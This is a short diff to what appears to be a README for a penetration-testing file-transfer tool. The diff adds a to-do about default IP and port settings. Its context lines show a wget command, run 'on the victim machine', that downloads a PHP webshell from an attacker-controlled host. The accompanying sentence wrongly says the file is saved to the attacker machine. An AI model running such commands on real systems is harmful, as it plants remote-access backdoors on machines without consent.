@@ -26,3 +26,8 @@ And on the victim machine, we would run:
 wget http://<your ip>:8000/webshell.php
 ```
 This will save the PHP webshell to the attacker machine under the filename: "webshell.php"
+
+---
+
+## To-Do:
+- Allow default IP/port by adding a config specifying which network device to get IP from
